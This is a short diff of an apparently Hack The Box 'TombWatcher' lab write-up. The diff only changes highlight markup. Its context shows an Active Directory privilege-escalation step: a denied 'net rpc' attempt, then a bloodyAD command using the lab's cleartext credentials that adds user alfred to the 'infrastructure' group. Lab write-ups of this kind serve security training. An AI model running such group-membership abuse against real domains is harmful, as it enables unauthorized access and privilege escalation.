@@ -153,11 +153,11 @@ This can usually be done using `net rpc` but in this case I was getting the foll
 
 ```shell
 net rpc group addmem "infrastructure" "alfred" -U "tombwatcher.htb"/"alfred"%"basketball" -S "10.10.11.72"
-Could not add alfred to infrastructure: ==NT_STATUS_ACCESS_DENIED==
+Could not add alfred to infrastructure: !!NT_STATUS_ACCESS_DENIED!!
 ```
 
 ```shell
-bloodyAD ==--host== 10.10.11.72 -d tombwatcher.htb -u alfred -p 'basketball' add groupMember  "infrastructure"  alfred
+bloodyAD !!--host!! 10.10.11.72 -d tombwatcher.htb -u alfred -p 'basketball' add groupMember  "infrastructure"  alfred
 [+] alfred added to infrastructure
 ```
 
